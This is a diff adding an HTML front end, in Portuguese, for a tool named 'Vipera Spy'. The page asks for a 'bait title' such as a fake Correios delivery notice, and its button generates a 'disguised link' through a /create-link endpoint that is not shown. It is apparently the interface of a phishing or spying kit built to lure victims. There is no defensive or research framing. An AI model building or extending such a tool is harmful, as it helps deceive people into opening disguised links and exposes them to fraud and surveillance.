@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vipera Spy</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-br from-purple-950 via-black to-violet-950 text-white min-h-screen flex items-center justify-center p-4">
+    <div class="max-w-md w-full">
+        <div class="text-center mb-10">
+            <h1 class="text-6xl font-black tracking-tighter text-purple-400">🐍 VIPERA</h1>
+            <p class="text-purple-300 text-xl">SPY</p>
+        </div>
+        
+        <form id="form" class="space-y-6">
+            <input name="title" placeholder="Título da isca (ex: Entrega Correios)" 
+                   class="w-full p-5 bg-black/60 border border-purple-500 rounded-3xl text-lg focus:border-purple-400" required>
+            <button type="submit" 
+                    class="w-full py-6 bg-gradient-to-r from-purple-600 to-fuchsia-600 hover:from-purple-700 hover:to-fuchsia-700 rounded-3xl font-bold text-xl">
+                    GERAR LINK DISFARÇADO
+            </button>
+        </form>
+        
+        <div id="result" class="mt-8 hidden"></div>
+    </div>
+
+    <script>
+        document.getElementById('form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const fd = new FormData(e.target);
+            const res = await fetch('/create-link', {method:'POST', body: fd});
+            const data = await res.json();
+            document.getElementById('result').innerHTML = `
+                <div class="bg-black/70 p-6 rounded-3xl border border-purple-500">
+                    <p class="text-green-400 break-all font-mono">${data.link}</p>
+                </div>`;
+            document.getElementById('result').classList.remove('hidden');
+        });
+    </script>
+</body>
+</html>
